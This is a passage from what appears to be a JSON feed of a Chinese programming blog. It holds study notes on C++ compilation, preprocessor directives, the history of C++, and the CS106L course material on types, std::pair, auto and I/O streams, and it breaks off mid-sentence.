b.s.position.push_front(std::pair&lt;int, int&gt;(x, y));\n    b.arr[x][y] = &#39;S&#39;;\n&#125;\n</code></pre>\n<h1 id=\"bug-修复\"><a href=\"#bug-修复\" class=\"headerlink\" title=\"bug 修复\"></a>bug 修复</h1><ol>\n<li><code>random()</code>随机数产生需要在后面 +1</li>\n<li>为<code>board</code>新增<code>plain</code>字段, 让蛇占据所有空间后,通知用户通关!</li>\n<li>长度为 1 时,可以反方向运动</li>\n</ol>\n",
            "tags": [
                "C++"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E7%BC%96%E8%AF%91%E4%B8%8E%E5%B7%A5%E7%A8%8B%E6%9E%84%E5%BB%BA/",
            "url": "https://salvely.github.io/blog/2023/10/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E7%BC%96%E8%AF%91%E4%B8%8E%E5%B7%A5%E7%A8%8B%E6%9E%84%E5%BB%BA/",
            "title": "C++编译与工程构建",
            "date_published": "2023-10-27T09:45:08.000Z",
            "content_html": "<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>我们在课程中写的都是代码量不大的小文件，但是在实际工程开发中，情况可就不一样了。但是那么多的代码，我们不可能将它们放在同一个文件中，肯定要分成不同的源文件。但是如何分解程序？如何实现程序之间的交流，就成了一个问题。本节中我们将探讨如何将一个大的工程分成不同的源程序，并且实现这些源程序之间的交流。我们首先介绍 C++ 的编译模型，也就是 C++ 源程序是如何编译成为机器可理解的二进制代码的。然后，我们讨论如何将一个大的工程分解为多个小的源程序，并且实现他们之间的交流。最后，我们探讨 C++ 的预处理器的工作模式。</p>\n<h1 id=\"C-编译模型\"><a href=\"#C-编译模型\" class=\"headerlink\" title=\"C++ 编译模型\"></a>C++ 编译模型</h1><p>C++ 是一种编译型的语言，即通过编译器将源代码转化为机器可以理解的二进制代码。其编译过程分为 3 个阶段：</p>\n<ul>\n<li>预处理阶段：扩展头文件，进行宏替换等</li>\n<li>编译阶段：将预处理后的高级语言代码转化为机器可以理解的二进制代码，即目标文件。在这个阶段，编译器会检查一些语法错误，如漏掉了<code>;</code>等</li>\n<li>链接阶段：将生成的多个目标文件合并成一个最终的可执行文件</li>\n</ul>\n<p>语法错误主要集中在编译阶段进行检查，而程序的一些其他问题则多半是出现在链接阶段。例如，程序可能定义了一个函数的原型，并且对他进行了调用，但是却没有实现这个函数。又或者，定义的函数原型和实现不一样，按照函数原型进行调用以后，程序找不到函数的实现。有的人会奇怪为什么这种错误会出现在链接阶段，是因为链接器没有在这个文件中找到函数原型时，他会本能的想到是不是在需要链接的其他文件中。如果在其他文件中也没有找到的话，链接器才会告诉你出现了链接错误。</p>\n<h1 id=\"模块化与分解\"><a href=\"#模块化与分解\" class=\"headerlink\" title=\"模块化与分解\"></a>模块化与分解</h1><p>通常来说，对于一个大的工程问题，我们无法一口气思考到所有的细节。而在这种情况下，我们倾向于将问题分解成不同的模块，然后通过不同模块间的合作和交流来解决。但是，如何确定模块划分的粒度呢？毕竟越往下分，细节就越多。而在这个时候，我们会选择使用一些抽象的接口。举个例子，我们无需设计 C++ STL，只需要调用其提供给我们的接口，便可以实现多种功能。而这就是模块划分的尽头。<br>对于模块化，通常来说遵循 3 个原则：</p>\n<ul>\n<li>简单化：提供一个较为简单的接口</li>\n<li>可扩展：在需要的时候，我们可以在不改变接口的条件下改变其实现方式。</li>\n<li>可复用：接口足够泛用（使用泛型，模板之类），可以保证函数可以被用在多个不同的项目中</li>\n</ul>\n<h1 id=\"C-预处理器\"><a href=\"#C-预处理器\" class=\"headerlink\" title=\"C++ 预处理器\"></a>C++ 预处理器</h1><h2 id=\"前言-1\"><a href=\"#前言-1\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在编写 C++ 程序时，我们通常把一个程序分为<code>file.h</code>和<code>file.cpp</code>两个部分。<code>file.h</code>中描述的是程序提供的类及函数接口（定义），而<code>.cpp</code>文件中描述的是其实现。此外，通常在<code>.h</code>文件的前后，会加上如下内容：</p>\n<pre><code class=\"cpp\">#ifndef StrUtils_Included\n#define StrUtils_Included\n\n#include &lt;string&gt;\nusing namespace std;\nstring ConvertToUpperCase(string input);\nstring ConvertToLowerCase(string input);\nstring IntegerToString(int value);\nstring DoubleToString(double value);\n\n#endif\n</code></pre>\n<h2 id=\"include头文件\"><a href=\"#include头文件\" class=\"headerlink\" title=\"include头文件\"></a><code>include</code>头文件</h2><p>其作用在于将头文件的内容复制到<code>#include</code>处。头文件分为两种，一种用<code>&lt;&gt;</code>包起，是 C++ 标准库中的文件；而另外一种用<code>&quot;&quot;</code>包起，是用户自定义的头文件，编译器会在当前工程文件夹下找。</p>\n<h2 id=\"define定义与替换\"><a href=\"#define定义与替换\" class=\"headerlink\" title=\"define定义与替换\"></a><code>define</code>定义与替换</h2><p>宏定义的基本格式是<code>define val replacement</code>。在进行宏替换时，做的不是值替换，而是普通的字符串的替换。即将程序中所有的<code>val</code>都替换成<code>replacement</code>。在进行宏替换时编译器并不理解这到底是什么东西，就是简单的左无脑替换。因此在替换时必须要注意，譬如：</p>\n<pre><code class=\"cpp\">#define a 5 + 10\n...\nint b = 2 * a;\n</code></pre>\n<p>在进行宏替换后，效果如下：</p>\n<pre><code class=\"cpp\">int b = 2 * 5 + 10;\n</code></pre>\n<p>而不是:</p>\n<pre><code class=\"cpp\">int b = 2 * (5 + 10);\n</code></pre>\n<p>因为它做的仅仅是简单的字符串替换。这种错误经常发生，而要避免这类错误的方法是：</p>\n<ol>\n<li>在<code>define</code>时使用<code>()</code>圆括号</li>\n<li>使用<code>const</code>语句</li>\n</ol>\n<h2 id=\"include-guard\"><a href=\"#include-guard\" class=\"headerlink\" title=\"include guard\"></a><code>include guard</code></h2><p>预处理语句可以通过条件判断来决定是否要定义某些文件，一个简单的格式如下：</p>\n<pre><code class=\"cpp\">ifndef...define...endif\n</code></pre>\n<p>这套语句的基本意思是：如果已经<code>#include</code>过上述文件，就不需要再定义一次了。C++ 工程文件之间相互<code>#include</code>是家常便饭，这样做是为了防止由于多次互相<code>#include</code>带来的重定义问题。上述语句只是一个较为简化的版本，更为完整的定义是：</p>\n<pre><code class=\"cpp\">  #if statement\n  ...\n  #elif another-statement\n  ...\n  #elif yet-another-statement\n  ...\n  #else\n  ...\n  #endif\n</code></pre>\n<p>这其中的<code>statement</code>可以是条件判断语句，也可以是<code>define()</code>语句。做条件判断时，使用的必须是已经定义过的变量，如：</p>\n<pre><code class=\"cpp\">  #if MY_CONSTANT &gt; 137 // Legal\n  #if MY_CONSTANT * 42 == MY_CONSTANT // Legal\n  #if sqrt(MY_CONSTANT) &lt; 4 // Illegal, cannot call function sqrt\n  #if MY_CONSTANT == 3.14 // Illegal, can only use integral values\n</code></pre>\n<p>而使用<code>define</code>语句时，如果变量已经定义，则<code>define()</code>返回<code>true</code>，否则返回<code>false</code>。例如：</p>\n<pre><code class=\"cpp\">  #if defined(MY_CONSTANT) // Evaluates to true.\n  #if defined(OTHER_CONSTANT) // Evaluates to false.\n  #if !defined(MY_CONSTANT) // Evaluates to false.\n</code></pre>\n<p>其判断结果被应用在<code>if</code>语句中。例如：</p>\n<pre><code class=\"cpp\">#if defined(A)\n    cout &lt;&lt; &quot;A is defined.&quot; &lt;&lt; endl;\n#elif defined(B)\n    cout &lt;&lt; &quot;B is defined.&quot; &lt;&lt; endl;\n#elif defined(C)\n     cout &lt;&lt; &quot;C is defined.&quot; &lt;&lt; endl;\n#else\n    cout &lt;&lt; &quot;None of A, B, or C is defined.&quot; &lt;&lt; endl;\n#endif\n</code></pre>\n<p>这套语句的效果相当于将所有<code>include</code>的内容复制粘贴到源程序中，但是注释掉重复定义的部分。它和注释不一样之处在于，这套语句可以嵌套，而注释不能。</p>\n<h2 id=\"宏\"><a href=\"#宏\" class=\"headerlink\" title=\"宏\"></a>宏</h2><h2 id=\"内联函数\"><a href=\"#内联函数\" class=\"headerlink\" title=\"内联函数\"></a>内联函数</h2>",
            "tags": [
                "C++",
                "CMake",
                "Makefile"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%9D%82%E8%B0%88/C++%E7%9A%84%E8%AF%9E%E7%94%9F%E4%B8%8E%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/",
            "url": "https://salvely.github.io/blog/2023/10/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%9D%82%E8%B0%88/C++%E7%9A%84%E8%AF%9E%E7%94%9F%E4%B8%8E%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/",
            "title": "C++的诞生与一些思考",
            "date_published": "2023-10-25T06:00:48.000Z",
            "content_html": "<p>最近在学习斯坦福的 CS106L，学习标准 C++。在阅读<span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2NzMTA2bC9mdWxsX2NvdXJzZV9yZWFkZXIucGRm\">Course Reader</span>的 Introduction 部分时，作者介绍了 C++的诞生故事，对我颇有启发。</p>\n<p>C++的创始人在剑桥大学读 PhD 时，主要研究的是分布式系统。在当时，他使用了一种叫 Simula 的面向对象语言。他在 Simula 中初始化电脑对象和网络对象，来模拟系统之间通过网络的交互。但是在开发的过程中，他发现，虽然使用 Simula 来对整个过程进行模拟，非常的快速，但是 Simula 的执行速度非常慢。而后，他又尝试通过一种名为 BCPL 的语言进行开发。但是新的问题又出现了，这种语言是一种较底层的系统语言，并不具备面向对象等特性。虽然执行速度快，但是搭建系统的过程非常的痛苦和繁琐。</p>\n<p>在博士毕业后，他来到了贝尔实验室工作。在这里他接触了一门高效的高级语言，C 语言。此后，他在 C 语言的基础上，拓展了类，而后又增加了一些新的特性。他把这种语言称之为 C++。</p>\n<p>从他的故事来看，再结合之前 OpenAI 创始人的书《伟大不能被计划》，我们可以看到，有的时候我们在探索目标的过程中，可能会遇到一些新的尚未发现过的东西，探索这项新知，可能会让我们更慢达到目标，但是可以让我们在沿途看到更多的风景。 C++ 创始人在研究分布式系统的过程中，意外创造了 C++ 语言。有的人可能会因为创造一门语言所需要的工作量而被劝退，殊不知这正是伟大的开端。有时候我们在是做事情时，可以多想一点点，多做一点点，多探索，多思考，多创造，而不是重复原有的工作，那正是创造力和新世界的大门。</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/",
            "url": "https://salvely.github.io/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/C++%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/",
            "title": "C++参考资料",
            "date_published": "2023-10-22T08:47:56.000Z",
            "content_html": "<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pc29jcHAuZ2l0aHViLmlvL0NwcENvcmVHdWlkZWxpbmVzL0NwcENvcmVHdWlkZWxpbmVz\">C++ Core Guidelines</span></li>\n<li></li>\n</ul>\n",
            "tags": [
                "C++",
                "参考资料"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/CS106L/",
            "url": "https://salvely.github.io/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/CS106L/",
            "title": "Stanford CS106L:Standard C++ Programming",
            "date_published": "2023-10-22T03:36:26.000Z",
            "content_html": "<h1 id=\"课程资料\"><a href=\"#课程资料\" class=\"headerlink\" title=\"课程资料\"></a>课程资料</h1><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMUs4NDExYjdBVS8/c3BtX2lkX2Zyb209MzMzLjMzNy5zZWFyY2gtY2FyZC5hbGwuY2xpY2smdmRfc291cmNlPTg1YWNmMGE1OWRlZDAyZTRjNzVhZTExNThiYWNhMjA3\">Video</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2FyY2hpdmUvY3MvY3MxMDZsL2NzMTA2bC4xMjI0Lw==\">Slides&#x2F;Code</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2NzMTA2bC9mdWxsX2NvdXJzZV9yZWFkZXIucGRm\">Course Reader</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2NzMTA2bC9hc3NpZ25tZW50LXNldHVw\">Assignment</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29yZ3MvY291cnNld29ya3MvcmVwb3NpdG9yaWVzP3E9QVAxNDAxLTImdHlwZT1hbGwmbGFuZ3VhZ2U9JnNvcnQ9\">AP1401-2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2FyY2hpdmUvY3MvY3MxMDZsL2NzMTA2bC4xMjEyLw==\">Spring 2021 资料</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuc3RhbmZvcmQuZWR1L2NsYXNzL2NzMTA2bC9sZWN0dXJlcy8=\">综合资料</span></li>\n</ul>\n<h1 id=\"学习流程\"><a href=\"#学习流程\" class=\"headerlink\" title=\"学习流程\"></a>学习流程</h1><pre><code class=\"cpp\">for(int i = 0; i &lt; 17; i++) &#123;\n    1. 阅读 Course Reader对应章节\n    2. 观看video\n    3. 阅读Slides\n    4. 整理Code\n&#125;\n</code></pre>\n<p>以上流程完成后：</p>\n<ol>\n<li>完成 CS106L 所有 Assignment</li>\n<li>完成 AP1401-2 所有作业</li>\n</ol>\n<h1 id=\"Welcome\"><a href=\"#Welcome\" class=\"headerlink\" title=\"Welcome\"></a>Welcome</h1><p>本节课主要讲述了 C++的应用前景，历史发展和设计哲学。</p>\n<h2 id=\"C-应用前景\"><a href=\"#C-应用前景\" class=\"headerlink\" title=\"C++应用前景\"></a>C++应用前景</h2><p><img data-src=\"/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/CS106L/future.png\" alt=\"C++应用前景\"></p>\n<h2 id=\"C-的历史\"><a href=\"#C-的历史\" class=\"headerlink\" title=\"C++的历史\"></a>C++的历史</h2><h3 id=\"汇编语言\"><a href=\"#汇编语言\" class=\"headerlink\" title=\"汇编语言\"></a>汇编语言</h3><p>在早期阶段，尚没有高级语言这一说。程序员大多使用汇编语言编写程序，汇编语言的好处在于：</p>\n<ul>\n<li>使用较为简单的指令进行编程</li>\n<li>汇编语言执行速度较快</li>\n<li>程序员可以直接操作计算机底层寄存器等</li>\n</ul>\n<p>但是，汇编语言编程也有它的缺陷，缺陷就在于：</p>\n<ul>\n<li>程序涉及到对计算机底层硬件的基础操作，而不只是处理逻辑，因此对其他程序员来说，阅读起来较为困难</li>\n<li>因为汇编语言涉及到指令集架构，而指令集架构和计算机底层硬件和操作系统紧密相关，因此在一台机器上运行的程序可能无法迁移到另一台程序，简单来说就是可移植性较差</li>\n<li>汇编语言编写的程序因为使用的是一些基本的操作，因此程序较长</li>\n</ul>\n<p>因此，<code>Ken Thompson</code>和<code>Dennis Ritchie</code>于 1972 年发明了 C 语言。</p>\n<h3 id=\"C-语言\"><a href=\"#C-语言\" class=\"headerlink\" title=\"C 语言\"></a>C 语言</h3><p>C 语言是一门高级语言，相较汇编，它的优势在于：</p>\n<ul>\n<li>面向过程编程，较为简单。程序员在编写程序时，无需考虑计算机底层架构，而只需要考虑处理逻辑，因此编程较为简单</li>\n<li>C 语言可以由编译器编译为汇编指令，在不同的机器上，可以编译出不同的汇编指令，而后汇编器又可以将汇编指令转化为针对该计算机指令集架构的机器指令，实现 C 语言的可迁移性</li>\n<li>C 语言程序执行速度非常快</li>\n</ul>\n<p>然而，在面对更复杂的编程问题时，C 语言也表现出了它的不足：</p>\n<ul>\n<li>C 语言是面向过程的语言，它无法面向对象。当我们需要更复杂的结构和它的一系列方法时，C 语言只为我们提供了一些有限的结构，无法满足我们对高级结构的需求</li>\n<li>C 语言无法对不同类型提供一个泛化的模板，对于不同类型的传入参数，我们可能需要重复写多个几乎一致的处理函数</li>\n<li>写大型项目时，很多时候很难将一个问题拆解为一个面向过程的模型，不是所有问题都可以使用模块化的过程方法解决</li>\n<li>写出来的程序较长</li>\n</ul>\n<h3 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C++\"></a>C++</h3><p>针对 C 语言的问题，<code>Bjarne Stroustrup</code>于 1983 年开发了 C++ 语言，他希望能够在 C 语言基础上实现一个具有多种不同特性的高级语言。 C++ 语言一开始只是<code>C with classes</code>，实现了 C 语言面向对象的延伸。而后逐步发展，直到今天的<code>C++23</code>。</p>\n<p><img data-src=\"/blog/2023/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C++/CS106L/evolution.png\" alt=\"C++的演化\"></p>\n<h2 id=\"C-的几大特性\"><a href=\"#C-的几大特性\" class=\"headerlink\" title=\"C++的几大特性\"></a>C++的几大特性</h2><ul>\n<li>通用语言<br>有的语言可以在应用到多个场景中，但是在解决特定场景问题时会显得复杂，比如 C++ 在做矩阵乘除法时，需要程序员手动编写程序，效率较低。但是 C++ 的用途很广。而有的语言，可以解决特定问题，但是并不泛用。比如 Matlab 在做科学计算时非常的常用，但是在解决其他问题时并没有 C++ 高效。</li>\n<li>编译型语言<br>高级语言需要转换成机器可以阅读的二进制码才能被计算机执行。而高级语言分为编译型和解释型。其区别在于，解释型语言使用解释器(Interpreters)进行翻译，一边翻译一边执行。解释器在执行一条语句的同时，获取下一条语句。而编译型语言使用编译器进行编译。将整个源代码编译完成后，直接执行生成的二进制码。</li>\n<li>静态类型语言<br>静态类型语言是指语句中的每个变量在声明后都有固定的类型，一旦确定，不能随意更改。而动态类型（如 Python、Javascript）会在执行的过程中动态的判断变量的类型。静态类型语言会在编译阶段检查语句是否合法，否则产生编译错误。而动态类型通常无法在编译阶段确定该语句是否有编译错误，错误均在程序运行时产生，也称为运行时错误。编译阶段排错让运行时错误出现的概率大大降低。这样无需运行即可排除程序错误。</li>\n<li>多范式语言<br>部分语言只有单一范式，如 C 语言，无法编写面向对象程序。而 C++可以同时实现面向对象特性，泛型特性，和面向过程的特性。非常灵活。</li>\n<li>中间语言<br>部分底层语言（如汇编）直接和计算机内存打交道，但是利用其写出的程序逻辑不清晰，难以理解。而部分语言无法直接对计算机底层进行操纵（如 Python、Java)等，程序员在编写程序时就像是被禁锢，无法探索底层的奥秘。C++可以像 C 语言那样接触底层硬件（利用指针），也可以利用其面向对象特性构造大型程序，同时实现封装和抽象。触及底层系统和实现抽象的目的同时达到，非常便于程序员大展身手。</li>\n</ul>\n<h2 id=\"C-的设计哲学\"><a href=\"#C-的设计哲学\" class=\"headerlink\" title=\"C++的设计哲学\"></a>C++的设计哲学</h2><ul>\n<li>只有在需要解决特定问题时引入新的特性</li>\n<li>程序员可以自由选择编程风格</li>\n<li>隐藏实现细节，抽象出编程接口</li>\n<li>让程序员能够完全以自己想要的方式编写程序</li>\n<li>让编写的程序尽可能高效</li>\n<li>编译时进行类型检查</li>\n<li>可以兼容早期版本程序，也兼容 C 语言程序</li>\n</ul>\n<h2 id=\"C-的应用\"><a href=\"#C-的应用\" class=\"headerlink\" title=\"C++的应用\"></a>C++的应用</h2><ul>\n<li>浏览器</li>\n<li>JVM</li>\n<li>火星探索车</li>\n<li>等等</li>\n</ul>\n<h1 id=\"Type-and-Structs\"><a href=\"#Type-and-Structs\" class=\"headerlink\" title=\"Type and Structs\"></a>Type and Structs</h1><p>关于类型和结构体没什么好说的，主要的用法和 C 语言中差不多。但是<code>string</code>类在使用之前需要在程序最开始处<code>#include&lt;string&gt;</code>，并且最好是不要使用<code>using namespace std</code>，而是使用<code>std::string</code>，对于<code>std::cout</code>和<code>std::cin</code>也是一样。这样做是为了保证程序员在自主开发时，不和<code>std</code>域内的的东西重名导致出错。</p>\n<h2 id=\"std-pair\"><a href=\"#std-pair\" class=\"headerlink\" title=\"std::pair\"></a><code>std::pair</code></h2><p>一种<code>STL</code>内置结构，其中包括两个域。<code>std::pair</code>相当于是个模板，其中域的类型随意。声明时使用如下格式：</p>\n<pre><code class=\"cpp\">std::pair&lt;int,string&gt; p = &#123;1,&quot;st&quot;&#125;;\n</code></pre>\n<p>此外，还可以在程序中使用如下方法构建<code>std::pair</code>：</p>\n<pre><code class=\"cpp\">std::pair&lt;int,string&gt; p = std::make_pair(1,&quot;st&quot;);\n</code></pre>\n<p>在使用<code>pair</code>时，分别用<code>p.first</code>和<code>p.second</code>来引用两个域。</p>\n<h2 id=\"auto类型推导\"><a href=\"#auto类型推导\" class=\"headerlink\" title=\"auto类型推导\"></a><code>auto</code>类型推导</h2><p>使用<code>auto</code>变量表示允许编译器自行推导值的类型。<br>:::info<br>什么时候使用<code>auto</code>？</p>\n<ul>\n<li>使用迭代器时，我不关心值的类型</li>\n<li>使用模板时，值的类型已经可以根据上下文推断出来</li>\n<li>使用<code>lambda</code>时，咱不知道值是啥类型</li>\n<li>没那个必要时，尽量不要将<code>auto</code>作为返回值类型</li>\n</ul>\n<p>:::</p>\n<h1 id=\"Streams\"><a href=\"#Streams\" class=\"headerlink\" title=\"Streams\"></a>Streams</h1><blockquote>\n<p>How can we convert between string-represented data and the real thing? Streams!</p>\n</blockquote>\n<p>本节首先介绍了什么是环境，而后引入<code>Stream</code>的概念，讲解了<code>Streams</code>在读入和写出数据时的一些特点。而<code>Streams</code>可以利用<code>cin</code>和<code>cout</code>这两种<code>iostream</code>类的对象，实现从标准输入和控制台进行读取。也可以通过<code>ifstream</code>和<code>ofstream</code>两种来实现文件的读取和写入。亦可以通过<code>istringstrean</code>和<code>ostringstream</code>来实现字符串和其他类型之间的连接。但是普通的<code>cin</code>和<code>cout</code>在使用时也可能出现读取的问题，因此我们还可以使用<code>std::getline()</code>来进行一行一次的读取。此外，在使用<code>Stream</code>时，还应该注意判别读取异常和写入异常。</p>\n<h2 id=\"Streams-Overview\"><a href=\"#Streams-Overview\" class=\"headerlink\" title=\"Streams Overview\"></a>Streams Overview</h2><h3 id=\"Environment\"><a href=\"#Environment\" class=\"headerlink\" title=\"Environment\"></a>Environment</h3><p>在学习 Stream 之前，我们先要了解<code>Environment</code>（环境）的概念。我们家里有温度计，我们通常通过温度计上的水银球去检测环境温度，然后将摄氏度显示在数轴上，人们通过观测数轴上的数字来查看当前温度。在这个例子中，外界就是环境，水银球就是将温度转化为实际示数的媒介，而数轴就是温度的输出，将温度显示出来供人们了解。而在程序编写的过程中，也可能存在一个外部环境，程序需要从这个环境获取信息，然后在利用一些处理逻辑来进行一些计算，最后返回输出或者将输出打印在屏幕上。这个环境可能是用户输入，也可能是外部文件，还有可能是其他程序。</p>\n<h3 id=\"Stream-是什么\"><a href=\"#Stream-是什么\" class=\"headerlink\" title=\"Stream 是什么\"></a>Stream 是什么</h3><blockquote>\n<p>Streams is an abstraction for input and output. Streams convert between data and the string representation of data.</p>\n</blockquote>\n<p>Stream 是程序与外部环境交流的媒介。Stream 的输入与输出可能来自用户，也可能来自程序，也可能来自其他文件。如果要将一个变量输出到终端，那么变量就会以字符串的形式打入 Stream，然后 Stream 将其输出到终端。如果要从用户输入读取数据，那么也是将用户输入转化为字符串存储在 Stream 中，然后再将其转储到变量中。</p>\n<h3 id=\"Stream-特点\"><a href=\"#Stream-特点\" class=\"headerlink\" title=\"Stream 特点\"></a>Stream 特点</h3><ul>\n<li>可以对大体积数据进行分片读取，然后存储</li>\n<li>可以读取多个类型的数据</li>\n<li>可以串联多个<code>&lt;&lt;</code>读取</li>\n</ul>\n<h2 id=\"cin-与-cout：来自键盘，去往终端\"><a href=\"#cin-与-cout：来自键盘，去往终端\" class=\"headerlink\" title=\"cin 与 cout：来自键盘，去往终端\"></a>cin 与 cout：来自键盘，去往终端</h2><p><code>cout</code>为 Stream 对象，它从变量中获取数据，存储到一个 Buffer 中，然后将其<strong>输出到终端上</strong>。<br><code>cin</code>也是 Stream 对象，它从<strong>用户输入</strong>获取值，存储到一个 Buffer 中，然后将其转储到对应类型的变量中。<br>在使用这两个输入流前，需要在程序开始处<code>#include &lt;iostream&gt;</code></p>\n<h2 id=\"ifstream-与-ofstream：来自文件，去往文件\"><a href=\"#ifstream-与-ofstream：来自文件，去往文件\" class=\"headerlink\" title=\"ifstream 与 ofstream：来自文件，去往文件\"></a>ifstream 与 ofstream：来自文件，去往文件</h2><p>:::info</p>\n<p>问题思考：</p>\n<ol>\n<li><code>ifstream</code>和<code>ofstream</code>分别是什么？</li>\n<li>还有什么特殊的读写文件类？特殊在哪？</li>\n<li><code>i/ofstream</code>和<code>cin/cout</code>在使用上有什么不一样之处？</li>\n<li>使用<code>ifstream</code>和<code>ofstream</code>需要包含什么头文件？</li>\n<li><code>ifstream</code>怎么初始化？初始化后需要做哪些检查？</li>\n<li><code>ofstream</code>怎么初始化？初始化后需要做哪些检查？</li>\n<li>如果传入的文件名是<code>string</code>类型，如何处理？</li>\n<li><code>close()</code>时有哪些需要注意的地方？</li>\n</ol>\n<p>:::</p>\n<h3 id=\"ifstream-ofstream-Overview\"><a href=\"#ifstream-ofstream-Overview\" class=\"headerlink\" title=\"ifstream &amp; ofstream Overview\"></a>ifstream &amp; ofstream Overview</h3><p><code>ifstream</code>和<code>ofstream</code>分别从文件读取和写入文件。此外，还有一个叫做<code>fstream</code>的类型，即可以完成写入，又可以完成读取）。此外，<code>ifstream</code>和<code>ofstream</code>在使用上与<code>cin/cout</code>不一样之处在于，<code>ifstream</code>和<code>ofstream</code>是一个类型，而不是一个对象，但是<code>cin</code>及<code>cout</code>分别是<code>std::istream</code>和<code>std::ostream</code>类的对象。在使用对象的方法时(<code>&lt;&lt;</code>和<code>&gt;&gt;</code>已被重载)可以直接调用，但是在使用一个类的方法时，首先需要初始化这个类的一个对象，然后再对其方法进行调用。</p>\n<h3 id=\"ifstream-ofstream-使用说明\"><a href=\"#ifstream-ofstream-使用说明\" class=\"headerlink\" title=\"ifstream &amp; ofstream 使用说明\"></a>ifstream &amp; ofstream 使用说明</h3><h4 id=\"包含头文件\"><a href=\"#包含头文件\" class=\"headerlink\" title=\"包含头文件\"></a>包含头文件</h4><pre><code class=\"cpp\">#include &lt;fstream&gt;\n</code></pre>\n<h4 id=\"ifstream-初始化-使用\"><a href=\"#ifstream-初始化-使用\" class=\"headerlink\" title=\"ifstream 初始化 &amp; 使用\"></a>ifstream 初始化 &amp; 使用</h4><p>可以直接使用构造函数，在参数列表中填入文件名进行初始化：</p>\n<pre><code class=\"cpp\">ifstream myStream(&quot;file.txt&quot;);\n</code></pre>\n<p>也可以在使用默认构造函数初始化后，利用类的<code>open()</code>方法打开文件：</p>\n<pre><code class=\"cpp\">ifstream myStream;\nmyStream.open(&quot;file.txt&quot;);\n</code></pre>\n<p>使用<code>ifstream</code>对象的方法与使用<code>cin</code>相似，如下：</p>\n<pre><code class=\"cpp\">myStream &gt;&gt; myInteger\n</code></pre>\n<p>注意，在<code>open()</code>方法调用后，推荐使用<code>myStream.is_open()</code>来探测是否真的成功打开了文件。</p>\n<h4 id=\"ofstream-初始化-使用\"><a href=\"#ofstream-初始化-使用\" class=\"headerlink\" title=\"ofstream 初始化 &amp; 使用\"></a>ofstream 初始化 &amp; 使用</h4><p><code>ofstream</code>初始化过程及使用过程与前文<code>ifstream</code>相似。若文件不存在，调用<code>open()</code>方法会新创建一个文件，否则会覆盖原有的同名文件。（所以尽量做好备份）</p>\n<h4 id=\"关闭流：close\"><a href=\"#关闭流：close\" class=\"headerlink\" title=\"关闭流：close()\"></a>关闭流：<code>close()</code></h4><ol>\n<li>当流的生命周期结束时，C++会为你自动关闭流</li>\n<li>你也可以手动使用<code>close()</code>方法关闭流</li>\n</ol>\n<h4 id=\"使用-string-作为文件名时…\"><a href=\"#使用-string-作为文件名时…\" class=\"headerlink\" title=\"使用 string 作为文件名时…\"></a>使用 string 作为文件名时…</h4><p>注意，<code>string</code>类的开发时间要晚于<code>ifstream</code>和<code>ofstream</code>，彼时<code>ifstream</code>和<code>ofstream</code>只接受 C 语言的字符串类型。因此，要将一个<code>string</code>类型的文件名传入这两个类的对象，我们必须调用<code>.c_str()</code>来将其转化为 C 语言格式的字符串。</p>\n<h2 id=\"Stream-manipulators\"><a href=\"#Stream-manipulators\" class=\"headerlink\" title=\"Stream manipulators\"></a>Stream manipulators</h2><p><code>stream manipulator</code>可以让对变量及输出的处理更加方便，程序员无需手动编程实现一些较为繁琐的功能。几种常用的<code>stream 